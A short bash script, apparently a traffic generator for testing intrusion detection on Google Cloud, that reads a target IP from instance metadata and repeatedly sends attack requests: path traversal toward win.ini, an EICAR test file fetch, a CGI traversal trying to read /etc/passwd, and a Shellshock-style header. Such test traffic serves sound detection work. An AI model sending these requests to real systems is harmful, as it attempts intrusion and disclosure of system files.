#!/bin/bash
apt-get update
apt-get install curl -y
 TARGET_IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/TARGET_IP" -H "Metadata-Flavor: Google")
counter=50
while [ $counter -gt 0 ];
do
    curl http://$TARGET_IP/?item=../../../../WINNT/win.ini
    curl http://$TARGET_IP/eicar.file
    curl http://$TARGET_IP/cgi-bin/../../../..//bin/cat%20/etc/passwd
    curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://$TARGET_IP/cgi-bin/test-critical
    sleep 60
    ((counter--))
done